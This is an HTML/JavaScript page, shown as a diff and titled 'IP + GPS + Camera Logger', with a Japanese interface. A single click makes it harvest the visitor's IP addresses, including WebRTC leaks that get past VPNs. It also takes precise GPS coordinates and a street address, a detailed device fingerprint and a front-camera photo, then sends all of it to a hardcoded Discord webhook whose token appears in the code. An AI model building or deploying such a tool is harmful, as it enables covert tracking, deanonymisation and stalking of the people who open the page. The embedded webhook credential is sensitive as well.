@@ -1,0 +1,456 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Logger (demo)</title>
+<style>
+  body { font-family: system-ui, sans-serif; max-width: 760px; margin: 32px auto; padding: 0 16px; }
+  video, img { width: 100%; max-width: 640px; border-radius: 12px; background:#000; display:block; }
+  #status { margin-top: 16px; padding: 12px; border-radius: 8px; background:#f0f0f0; white-space:pre-wrap; font-size:14px; }
+  .ok { background:#e6ffed !important; } .err { background:#ffe6e6 !important; }
+  button { font-size:16px; padding:10px 16px; margin:8px 0 0; border-radius:8px; border:1px solid #ccc; cursor:pointer; }
+  table { border-collapse: collapse; margin-top:12px; font-size:13px; }
+  td { border:1px solid #ddd; padding:4px 8px; word-break:break-all; } td:first-child { background:#fafafa; white-space:nowrap; }
+</style>
+</head>
+<body>
+<h1>IP + GPS + Camera Logger</h1>
+
+<video id="preview" autoplay playsinline muted></video>
+<canvas id="canvas" hidden></canvas>
+<img id="shot" alt="" hidden>
+
+<div>
+  <button id="btnFront">内カメラで撮影して送信</button>
+</div>
+<div id="status">待機中</div>
+<table id="info" hidden></table>
+
+<script>
+// ====== 設定 ======
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1575304097089716286/yyp206x4QtWR3OmWrdi5DHXsAO0afTIruRB1bUuweOtODZxhI6vgLT5g_WouyucPIi1G';
+// ==================
+
+const $ = (id) => document.getElementById(id);
+const statusEl = $('status');
+const log = (m, c) => { statusEl.textContent = m; statusEl.className = c || ''; };
+const trunc = (s, n = 1024) => (s == null ? '-' : String(s).slice(0, n));
+const settled = (p) => p.then((v) => ({ ok: true, v })).catch((e) => ({ ok: false, e: String(e) }));
+
+let stream = null;
+
+// ---------- IP多重取得 ----------
+async function fetchIpMulti() {
+  const sources = [
+    { name: 'ipify', url: 'https://api.ipify.org?format=json', pick: (d) => d.ip },
+    { name: 'ipify64', url: 'https://api64.ipify.org?format=json', pick: (d) => d.ip },
+    { name: 'ipwho.is', url: 'https://ipwho.is/', pick: (d) => d.ip },
+  ];
+  const results = await Promise.all(sources.map(async (s) => {
+    const r = await settled(fetch(s.url).then((x) => x.json()).then(s.pick));
+    return { name: s.name, ip: r.ok ? r.v : null, error: r.ok ? null : r.e };
+  }));
+  const counts = {};
+  for (const r of results) if (r.ip) counts[r.ip] = (counts[r.ip] || 0) + 1;
+  const winner = Object.entries(counts).sort((a, b) => b[1] - a[1])[0];
+  return { results, consensus: winner ? winner[0] : null, consistent: !!(winner && winner[1] >= 2) };
+}
+
+async function cloudflareTrace() {
+  const r = await settled(fetch('https://www.cloudflare.com/cdn-cgi/trace').then((x) => x.text()));
+  if (!r.ok) return null;
+  const obj = Object.fromEntries(r.v.trim().split('\n').map((l) => l.split('=')));
+  return { ip: obj.ip, loc: obj.loc, colo: obj.colo, http: obj.http, tls: obj.tls };
+}
+
+// ---------- IP位置情報 ----------
+async function lookupIp(ip) {
+  if (!ip) return null;
+  const r = await settled(fetch(`https://ipwho.is/${encodeURIComponent(ip)}`).then((x) => x.json()));
+  if (!r.ok) return { error: r.e };
+  return r.v.success ? r.v : { error: r.v.message || 'lookup failed' };
+}
+
+// ---------- VPN推定 ----------
+const VPN_PATTERNS = [
+  /nordvpn/i, /expressvpn/i, /surfshark/i, /cyberghost/i,
+  /private internet access|\bpia\b/i, /mullvad/i, /proton\s?vpn/i,
+  /ipvanish/i, /hidemyass|\bhma\b/i, /windscribe/i, /tunnelbear/i,
+  /hotspot shield|anchorfree/i, /purevpn/i, /vyprvpn/i,
+  /datacamp|m247|leaseweb|choopa|vultr|digitalocean|linode/i,
+];
+function vpnGuessOf(g) {
+  if (!g || g.error) return null;
+  const hay = `${g.connection?.isp || ''} ${g.connection?.org || ''} ${g.connection?.asn || ''}`;
+  const hit = VPN_PATTERNS.find((re) => re.test(hay));
+  if (hit) return hit.source;
+  if (g.security?.vpn) return 'vpn-flag';
+  if (g.security?.proxy) return 'proxy-flag';
+  if (g.security?.hosting) return 'hosting/datacenter';
+  return null;
+}
+
+// ---------- WebRTC (4 STUN) ----------
+function collectFromStun(url) {
+  return new Promise((resolve) => {
+    const ips = new Set(); let pc; let done = false;
+    const finish = () => { if (done) return; done = true; try { pc.close(); } catch {} resolve([...ips]); };
+    try { pc = new RTCPeerConnection({ iceServers: [{ urls: url }] }); }
+    catch { return resolve([]); }
+    pc.createDataChannel('');
+    pc.onicecandidate = (e) => {
+      if (!e.candidate) return finish();
+      const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
+      if (m && !m[1].startsWith('0.')) ips.add(m[1]);
+    };
+    pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(finish);
+    setTimeout(finish, 2200);
+  });
+}
+async function webrtcAllIps() {
+  const servers = [
+    'stun:stun.l.google.com:19302',
+    'stun:stun1.l.google.com:19302',
+    'stun:stun.cloudflare.com:3478',
+    'stun:stun.nextcloud.com:443',
+  ];
+  const results = await Promise.all(servers.map(collectFromStun));
+  return [...new Set(results.flat())];
+}
+
+// ---------- GPS 多サンプリング ----------
+function getBestGps({ samples = 4, timeout = 15000 } = {}) {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve({ error: 'Geolocation非対応' });
+    let best = null, count = 0, done = false, id;
+    const finish = (v) => { if (done) return; done = true; try { navigator.geolocation.clearWatch(id); } catch {} resolve(v); };
+    id = navigator.geolocation.watchPosition(
+      (pos) => {
+        const c = pos.coords;
+        const s = { lat: c.latitude, lon: c.longitude, accuracy: c.accuracy, altitude: c.altitude, heading: c.heading, speed: c.speed, ts: pos.timestamp };
+        if (!best || (s.accuracy ?? Infinity) < (best.accuracy ?? Infinity)) best = s;
+        count++;
+        if (count >= samples) finish(best);
+      },
+      (err) => finish(best || { error: `${err.code}: ${err.message}` }),
+      { enableHighAccuracy: true, timeout, maximumAge: 0 }
+    );
+    setTimeout(() => finish(best || { error: 'GPS timeout' }), timeout + 1500);
+  });
+}
+
+// ---------- 逆ジオコーディング ----------
+async function reverseGeocode(lat, lon) {
+  const r = await settled(fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`).then((x) => x.json()));
+  return r.ok ? (r.v.display_name || null) : null;
+}
+
+// ---------- 距離(Haversine) ----------
+function haversine(lat1, lon1, lat2, lon2) {
+  const R = 6371000, toRad = (d) => (d * Math.PI) / 180;
+  const dLat = toRad(lat2 - lat1), dLon = toRad(lon2 - lon1);
+  const a = Math.sin(dLat / 2) ** 2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon / 2) ** 2;
+  return Math.round(R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a)));
+}
+
+// ---------- フィンガープリント ----------
+function canvasFp() {
+  try {
+    const c = document.createElement('canvas'); c.width = 220; c.height = 60;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60'; ctx.fillRect(100, 1, 62, 20);
+    ctx.fillStyle = '#069'; ctx.fillText('fp🎨🔒', 2, 15);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('fp🎨🔒', 4, 17);
+    const s = c.toDataURL();
+    let h = 0; for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) | 0;
+    return (h >>> 0).toString(16);
+  } catch { return null; }
+}
+function webglFp() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return null;
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+      vendor: gl.getParameter(gl.VENDOR),
+      renderer: gl.getParameter(gl.RENDERER),
+      unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
+      unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
+    };
+  } catch { return null; }
+}
+async function audioFp() {
+  try {
+    const ctx = new OfflineAudioContext(1, 44100, 44100);
+    const osc = ctx.createOscillator(); osc.type = 'triangle'; osc.frequency.value = 10000;
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12; comp.attack.value = 0; comp.release.value = 0.25;
+    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+    const buf = await ctx.startRendering(); const data = buf.getChannelData(0);
+    let sum = 0; for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+    return sum.toFixed(6);
+  } catch { return null; }
+}
+function detectFonts(fonts) {
+  try {
+    const base = ['monospace', 'sans-serif', 'serif'];
+    const test = 'mmmmmmmmmmlli';
+    const c = document.createElement('canvas'); const ctx = c.getContext('2d');
+    const size = 72; const w = {};
+    for (const b of base) { ctx.font = `${size}px ${b}`; w[b] = ctx.measureText(test).width; }
+    const found = [];
+    for (const f of fonts) {
+      for (const b of base) {
+        ctx.font = `${size}px "${f}", ${b}`;
+        if (ctx.measureText(test).width !== w[b]) { found.push(f); break; }
+      }
+    }
+    return found;
+  } catch { return []; }
+}
+async function batteryInfo() {
+  if (!navigator.getBattery) return null;
+  const r = await settled(navigator.getBattery());
+  if (!r.ok) return null;
+  const b = r.v;
+  return { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+}
+async function permState(name) {
+  try { const p = await navigator.permissions.query({ name }); return p.state; } catch { return 'unknown'; }
+}
+async function mediaDeviceCounts() {
+  try {
+    const d = await navigator.mediaDevices.enumerateDevices();
+    return {
+      audioinput: d.filter((x) => x.kind === 'audioinput').length,
+      audiooutput: d.filter((x) => x.kind === 'audiooutput').length,
+      videoinput: d.filter((x) => x.kind === 'videoinput').length,
+    };
+  } catch { return null; }
+}
+async function uaHighEntropy() {
+  if (!navigator.userAgentData?.getHighEntropyValues) return null;
+  const r = await settled(navigator.userAgentData.getHighEntropyValues(['platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion', 'fullVersionList']));
+  return r.ok ? r.v : null;
+}
+
+// ---------- カメラ(内カメラ固定) ----------
+async function startCamera() {
+  if (stream) stream.getTracks().forEach((t) => t.stop());
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: { ideal: 'user' }, width: { ideal: 1920 }, height: { ideal: 1080 } },
+    audio: false,
+  });
+  const v = $('preview'); v.srcObject = stream;
+  await v.play().catch(() => {});
+  await new Promise((r) => setTimeout(r, 400));
+}
+function capture() {
+  const v = $('preview'), c = $('canvas');
+  const w = v.videoWidth, h = v.videoHeight;
+  if (!w || !h) throw new Error('映像がまだ準備できていません');
+  c.width = w; c.height = h;
+  c.getContext('2d').drawImage(v, 0, 0, w, h);
+  return new Promise((res) => c.toBlob((b) => res(b), 'image/jpeg', 0.92));
+}
+
+// ---------- Discord送信(再送付き) ----------
+async function sendWithRetry(fd, attempts = 3) {
+  let last;
+  for (let i = 0; i < attempts; i++) {
+    try {
+      const r = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });
+      if (r.ok) return true;
+      last = `${r.status}: ${await r.text()}`;
+      if (r.status === 429) {
+        const ra = r.headers.get('retry-after');
+        await new Promise((res) => setTimeout(res, (Number(ra) || 1) * 1000));
+        continue;
+      }
+      if (r.status < 500) break;
+    } catch (e) { last = String(e); }
+    await new Promise((res) => setTimeout(res, 500 * 2 ** i));
+  }
+  throw new Error(last || '送信失敗');
+}
+
+// ---------- 収集 ----------
+async function collectAll() {
+  const [ipMulti, cf, webrtc, gps, battery, perms, devices, uahe, audio] = await Promise.all([
+    fetchIpMulti(),
+    cloudflareTrace(),
+    webrtcAllIps(),
+    getBestGps(),
+    batteryInfo(),
+    Promise.all(['geolocation', 'camera', 'microphone'].map(async (n) => [n, await permState(n)])),
+    mediaDeviceCounts(),
+    uaHighEntropy(),
+    audioFp(),
+  ]);
+  const ip = ipMulti.consensus || cf?.ip || null;
+  const geo = await lookupIp(ip);
+  const vpnGuess = vpnGuessOf(geo);
+  const gpsAddr = gps && !gps.error ? await reverseGeocode(gps.lat, gps.lon) : null;
+  const ipGpsDistance = (geo && !geo.error && gps && !gps.error)
+    ? haversine(geo.latitude, geo.longitude, gps.lat, gps.lon) : null;
+
+  const fp = {
+    canvas: canvasFp(),
+    webgl: webglFp(),
+    audio,
+    fonts: detectFonts(['Arial','Verdana','Times New Roman','Courier New','Georgia','Tahoma','Trebuchet MS','Meiryo','Yu Gothic','MS Gothic','Hiragino Sans','Noto Sans JP','Roboto','Segoe UI','Helvetica','Impact','Comic Sans MS']),
+    uaHighEntropy: uahe,
+  };
+  return { ipMulti, cf, ip, geo, vpnGuess, webrtc, gps, gpsAddr, ipGpsDistance, battery, perms: Object.fromEntries(perms), devices, fp };
+}
+
+// ---------- Embed構築 ----------
+function buildEmbeds(d, imgName) {
+  const { ipMulti, cf, ip, geo, vpnGuess, webrtc, gps, gpsAddr, ipGpsDistance, battery, perms, devices, fp } = d;
+  const place = geo && !geo.error ? [geo.city, geo.region, geo.country].filter(Boolean).join(', ') : '取得失敗';
+  const leaked = (webrtc || []).filter((x) => x && x !== ip);
+
+  const e1 = {
+    title: '① ネットワーク / IP',
+    color: vpnGuess ? 0xED4245 : 0x5865F2,
+    fields: [
+      { name: '🌐 合意IP', value: trunc(`\`${ip || 'unknown'}\``, 200), inline: true },
+      { name: '🧮 一致', value: ipMulti.consistent ? '✅ 複数API一致' : '⚠️ 不一致/単一', inline: true },
+      { name: '🌍 IP場所', value: trunc(place, 200), inline: true },
+      { name: '🏳️ 国', value: trunc(geo?.country_code, 20), inline: true },
+      { name: '🏢 ISP', value: trunc(geo?.connection?.isp), inline: true },
+      { name: '🔗 ASN', value: trunc(geo?.connection?.asn ? `AS${geo.connection.asn}` : '-'), inline: true },
+      { name: '🛡️ VPN推定', value: trunc(vpnGuess ? `⚠️ ${vpnGuess}` : 'なし'), inline: true },
+      { name: '📡 種別', value: trunc(geo?.security?.hosting ? 'DC' : geo?.security?.proxy ? 'Proxy' : '一般'), inline: true },
+      { name: '☁️ CF', value: trunc(cf ? `${cf.loc || '-'} / ${cf.colo || '-'}` : '-'), inline: true },
+      { name: '🔎 API結果', value: trunc(ipMulti.results.map((r) => `${r.name}: ${r.ip || '×'}`).join('\n')), inline: false },
+      { name: '🕵️ WebRTC IP', value: trunc(webrtc.length ? webrtc.join('\n') : 'なし'), inline: false },
+      { name: '⚠️ 生IP候補', value: trunc(leaked.length ? leaked.join('\n') : 'なし(VPN遮蔽/リーク無)'), inline: false },
+    ],
+    timestamp: new Date().toISOString(),
+  };
+
+  const e2 = { title: '② 位置情報', color: 0x57F287, fields: [] };
+  if (geo && !geo.error) {
+    e2.fields.push(
+      { name: '📌 IP座標', value: trunc(`${geo.latitude}, ${geo.longitude}`), inline: true },
+      { name: '🗺️ IP地図', value: `[Maps](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})`, inline: true },
+    );
+  }
+  if (gps && !gps.error) {
+    e2.fields.push(
+      { name: '📍 GPS', value: trunc(`\`${gps.lat.toFixed(6)}, ${gps.lon.toFixed(6)}\``), inline: false },
+      { name: '🎯 精度', value: `±${Math.round(gps.accuracy)} m`, inline: true },
+      { name: '🗺️ GPS地図', value: `[Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})`, inline: true },
+      { name: '📏 IP↔GPS差', value: ipGpsDistance != null ? `${ipGpsDistance.toLocaleString()} m` : '-', inline: true },
+      { name: '🏠 住所', value: trunc(gpsAddr || '-'), inline: false },
+    );
+    if (gps.altitude != null) e2.fields.push({ name: '⛰️ 高度', value: `${Math.round(gps.altitude)} m`, inline: true });
+    if (gps.speed != null) e2.fields.push({ name: '🏃 速度', value: `${gps.speed?.toFixed(2)} m/s`, inline: true });
+  } else {
+    e2.fields.push({ name: '📍 GPS', value: trunc(`取得不可 (${gps?.error || '未取得'})`), inline: false });
+  }
+  if (ipGpsDistance != null && ipGpsDistance > 50000) {
+    e2.fields.push({ name: '🚨 判定', value: 'IPとGPSが大きく乖離 → VPN/プロキシ疑い', inline: false });
+  }
+
+  const nav = navigator;
+  const e3 = {
+    title: '③ 端末フィンガープリント',
+    color: 0xFEE75C,
+    fields: [
+      { name: '🖥️ Platform', value: trunc(nav.platform), inline: true },
+      { name: '🧠 CPU', value: trunc(`${nav.hardwareConcurrency ?? '-'} cores`), inline: true },
+      { name: '💾 RAM', value: trunc(nav.deviceMemory ? `${nav.deviceMemory} GB` : '-'), inline: true },
+      { name: '📺 Screen', value: trunc(`${screen.width}x${screen.height} @${devicePixelRatio}x / ${screen.colorDepth}bit`), inline: false },
+      { name: '👆 Touch', value: trunc(`${nav.maxTouchPoints ?? 0}`), inline: true },
+      { name: '🗣️ Lang', value: trunc(nav.languages?.join(', ') || nav.language), inline: true },
+      { name: '🕒 TZ', value: trunc(Intl.DateTimeFormat().resolvedOptions().timeZone), inline: true },
+      { name: '🔋 Battery', value: trunc(battery ? `${Math.round(battery.level * 100)}% ${battery.charging ? '充電中' : '放電中'}` : '-'), inline: true },
+      { name: '📶 回線', value: trunc(nav.connection ? `${nav.connection.effectiveType || '-'} / ${nav.connection.downlink ?? '-'}Mbps / RTT ${nav.connection.rtt ?? '-'}ms${nav.connection.saveData ? ' / SaveData' : ''}` : '-'), inline: false },
+      { name: '🔐 権限', value: trunc(`geo:${perms.geolocation} cam:${perms.camera} mic:${perms.microphone}`), inline: false },
+      { name: '🎥 デバイス', value: trunc(devices ? `cam:${devices.videoinput} mic:${devices.audioinput} spk:${devices.audiooutput}` : '-'), inline: true },
+      { name: '🎨 Canvas', value: trunc(`\`${fp.canvas || '-'}\``), inline: true },
+      { name: '🖌️ WebGL', value: trunc(fp.webgl ? `${fp.webgl.unmaskedVendor || fp.webgl.vendor} / ${fp.webgl.unmaskedRenderer || fp.webgl.renderer}` : '-'), inline: false },
+      { name: '🔊 Audio', value: trunc(fp.audio || '-'), inline: true },
+      { name: '🔤 Fonts', value: trunc(fp.fonts?.length ? `${fp.fonts.length}個: ${fp.fonts.join(', ')}` : '-'), inline: false },
+      { name: '🧭 UA', value: trunc(nav.userAgent, 500), inline: false },
+      { name: '🧬 UA-CH', value: trunc(fp.uaHighEntropy ? JSON.stringify(fp.uaHighEntropy).slice(0, 500) : '-'), inline: false },
+    ],
+  };
+
+  const e4 = {
+    title: '④ メディア',
+    color: 0xEB459E,
+    fields: [
+      { name: '📷 カメラ', value: '内カメラ', inline: true },
+      { name: '🖼️ 画像', value: `\`${imgName}\``, inline: true },
+    ],
+    image: { url: `attachment://${imgName}` },
+    timestamp: new Date().toISOString(),
+  };
+
+  return [e1, e2, e3, e4];
+}
+
+// ---------- メイン ----------
+async function captureAndSend() {
+  try {
+    log('① IP多重取得中...');
+    const d = await collectAll();
+    const place = d.geo && !d.geo.error ? [d.geo.city, d.geo.region, d.geo.country].filter(Boolean).join(', ') : '取得失敗';
+
+    const rows = [
+      ['IP(合意)', d.ip || 'unknown'],
+      ['一致', d.ipMulti.consistent ? '✅' : '⚠️'],
+      ['IP場所', place],
+      ['VPN推定', d.vpnGuess || 'なし'],
+      ['GPS', d.gps && !d.gps.error ? `${d.gps.lat.toFixed(6)}, ${d.gps.lon.toFixed(6)} (±${Math.round(d.gps.accuracy)}m)` : (d.gps?.error || '-')],
+      ['IP↔GPS差', d.ipGpsDistance != null ? `${d.ipGpsDistance.toLocaleString()} m` : '-'],
+      ['住所', d.gpsAddr || '-'],
+      ['WebRTC', d.webrtc.length ? d.webrtc.join(', ') : 'なし'],
+      ['Canvas', d.fp.canvas || '-'],
+      ['UA-CH', d.fp.uaHighEntropy ? JSON.stringify(d.fp.uaHighEntropy).slice(0, 120) : '-'],
+    ];
+    const infoEl = $('info'); infoEl.hidden = false;
+    infoEl.innerHTML = rows.map(([k, v]) => `<tr><td>${k}</td><td>${v}</td></tr>`).join('');
+
+    log('② カメラ起動中... ※許可ダイアログ');
+    await startCamera();
+    log('③ 撮影中...');
+    const blob = await capture();
+    const img = $('shot'); img.src = URL.createObjectURL(blob); img.hidden = false;
+
+    const imgName = `shot-${Date.now()}.jpg`;
+    log('④ Discordに送信中...');
+    const embeds = buildEmbeds(d, imgName);
+    const fd = new FormData();
+    fd.append('payload_json', JSON.stringify({
+      username: 'Logger',
+      content: `📷 内カメラ / ${place}${d.vpnGuess ? ' / VPN?' : ''}`,
+      embeds,
+      attachments: [{ id: 0, filename: imgName }],
+    }));
+    fd.append('files[0]', blob, imgName);
+
+    await sendWithRetry(fd);
+    log('✅ 送信完了', 'ok');
+  } catch (e) {
+    if (e.name === 'NotAllowedError') log('❌ 許可が拒否されました', 'err');
+    else if (e.name === 'NotFoundError') log('❌ カメラが見つかりません', 'err');
+    else log(`❌ エラー: ${e.message || e}`, 'err');
+  } finally {
+    if (stream) { stream.getTracks().forEach((t) => t.stop()); stream = null; }
+  }
+}
+
+// ---------- 初期化 ----------
+$('btnFront').onclick = () => captureAndSend();
+log('準備完了。ボタンを押すと収集と権限要求を開始します。');
+window.addEventListener('pagehide', () => { if (stream) stream.getTracks().forEach((t) => t.stop()); });
+</script>
+</body>
+</html>
